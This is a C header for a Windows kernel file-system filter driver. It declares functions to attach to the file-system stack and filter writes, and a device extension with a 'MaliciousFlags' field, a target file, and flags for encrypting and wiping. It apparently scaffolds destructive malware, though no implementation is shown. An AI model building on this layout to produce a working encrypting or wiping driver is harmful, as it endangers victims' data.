#ifndef FFdriver
#define FFdriver

#include <ntifs.h>

#define FLAG_ENCRYPT 0x01
#define FLAG_WIPE 0x02

typedef struct _DEVICE_EXTENSION {
	PDEVICE_OBJECT pLowerDeviceObject;
	ULONG MaliciousFlags;
	PUNICODE_STRING TargetFile;
} DeviceExtension, *pDeviceExtension;

NTSTATUS AttachToFileSystemStack(PDRIVER_OBJECT pDriverObject);
NTSTATUS FilterWrite(PDEVICE_OBJECT pDeviceObject, PIRP pIrp);
NTSTATUS DispatchPassDown(PDEVICE_OBJECT pDeviceObject, PIRP pIrp);

#endif FFdriver